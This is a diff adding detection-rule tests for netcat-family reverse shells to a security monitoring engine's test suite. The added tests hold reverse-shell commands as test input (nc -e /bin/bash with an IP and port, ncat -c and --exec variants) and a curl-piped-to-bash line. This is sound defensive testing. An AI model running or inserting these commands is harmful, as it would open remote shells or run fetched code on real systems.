@@ -150,3 +150,58 @@ def test_matches_real_auditd_event_with_no_user_name(engine):
     assert c is not None, "Expected a candidate even without user.name present"
     assert c.matched is True
     assert "user.name" not in (c.missing_fields or [])
+
+
+# ---------------------------------------------------------------------------
+# Netcat-family self-contained reverse shell: nc/ncat -e/-c/--exec
+# ---------------------------------------------------------------------------
+
+def test_matches_nc_dash_e_real_attack_command(engine):
+    """Exact command captured live on prod2: `nc -e /bin/bash HOST PORT` binds
+    a shell directly to the socket. process.name is "nc", not a shell — the
+    original rule only checked process.name in [sh,bash,dash,zsh], so this
+    self-contained netcat reverse shell went completely unmatched even though
+    curl/wget-piped-to-shell variants worked fine."""
+    c = _t1059(engine, _shell_event(
+        "nc -e /bin/bash 192.168.88.157 4444", name="nc", parent="bash"
+    ))
+    assert c is not None, "Expected a candidate for nc -e reverse shell"
+    assert c.matched is True
+    assert c.suppressed is False
+
+
+def test_nc_dash_e_adds_high_confidence_reason_and_score(engine):
+    baseline = _t1059(engine, _shell_event("curl http://x/s.sh | bash"))
+    ncexec = _t1059(engine, _shell_event(
+        "nc -e /bin/sh 10.0.0.1 4444", name="nc"
+    ))
+    assert ncexec.risk_score > baseline.risk_score
+    assert any("Netcat-family" in r for r in ncexec.adjustment_reasons)
+
+
+def test_matches_ncat_dash_c_variant():
+    c = _t1059(YAMLDetectionEngine(), _shell_event(
+        "ncat -c bash 10.0.0.1 4444", name="ncat"
+    ))
+    assert c is not None and c.matched is True
+
+
+def test_matches_ncat_long_form_exec_flag():
+    c = _t1059(YAMLDetectionEngine(), _shell_event(
+        'ncat --exec "/bin/bash" 10.0.0.1 4444', name="ncat"
+    ))
+    assert c is not None and c.matched is True
+
+
+def test_no_match_nc_port_scan_without_exec_flag(engine):
+    """Plain nc usage (port scan, banner grab, file transfer) must not match —
+    only the -e/-c/--exec shell-binding form is a reverse-shell indicator."""
+    c = _t1059(engine, _shell_event("nc -zv 10.0.0.1 1-1000", name="nc"))
+    assert c is None or c.matched is False
+
+
+def test_curl_pipe_bash_still_matches_after_nc_exec_addition():
+    """Regression guard: adding the netcat -e/-c/--exec branch must not
+    disturb the original shell+network-tool matching path."""
+    c = _t1059(YAMLDetectionEngine(), _shell_event("curl http://x/s.sh | bash"))
+    assert c is not None and c.matched is True
